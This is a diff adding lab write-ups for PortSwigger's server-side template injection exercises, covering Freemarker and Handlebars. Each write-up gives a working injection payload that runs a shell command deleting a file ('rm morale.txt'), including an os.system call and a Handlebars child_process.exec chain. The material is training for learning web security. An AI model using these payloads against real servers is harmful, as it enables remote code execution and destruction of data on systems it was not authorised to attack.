@@ -25,3 +25,54 @@ Analyzing both these requests shows us that changing preferred name has an inter
 3. Using {% %} to execute arbitrary code, we can craft the following payload: <br>
     `blog-post-author-display=user.name}}{%25%20import%20os%20%25}{{os.system('rm%20/home/carlos/morale.txt')}}` <br>
     URL-encoding the necessary characters (spaces - %20 and % - %25). This solves the lab.
+
+## SSTI using documentation
+[SSTI using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
+
+Write-up:
+
+1. We are instructed to discover the template engine used. If we click one of the posts, we have
+the option to edit a template, we can see that code is being executed to retrieve stock, for example.
+
+2. Using this [tool](https://cheatsheet.hackmanit.de/template-injection-table/), 
+we discover that this lab uses a Freemarker template.
+
+3. Using the [documentation](https://freemarker.apache.org/docs/api/index.html), we craft the following payload: <br> `${"freemarker.template.utility.Execute"?new()("rm morale.txt")}` <br> This solves the lab.
+
+## SSTI in an unknown language with a documented exploit
+[SSTI in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+
+Write-up:
+
+1. Like in the **Basic SSTI** lab, we can change a message parameter. Using this
+[tool](https://cheatsheet.hackmanit.de/template-injection-table/), we discover 
+this lab is using a Handlebars template (Javascript).
+
+2. Searching the internet for documented Handlebars SSTI exploits, we find this
+[link](https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2).
+
+3. Using the Node.js [docs](https://nodejs.org/api/child_process.html) for child_process,
+we can craft the following payload: <br>
+    ```
+    {{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+        {{this.pop}}
+        {{this.push (lookup string.sub "constructor")}}
+        {{this.pop}}
+        {{#with string.split as |codelist|}}
+            {{this.pop}}
+            {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');" }}
+            {{this.pop}}
+            {{#each conslist}}
+            {{#with (string.sub.apply 0 codelist)}}
+                {{this}}
+            {{/with}}
+            {{/each}}
+        {{/with}}
+        {{/with}}
+    {{/with}}
+    {{/with}}
+    ```
+
+4. URL-encoding this payload and submitting it as **message** solves the lab.
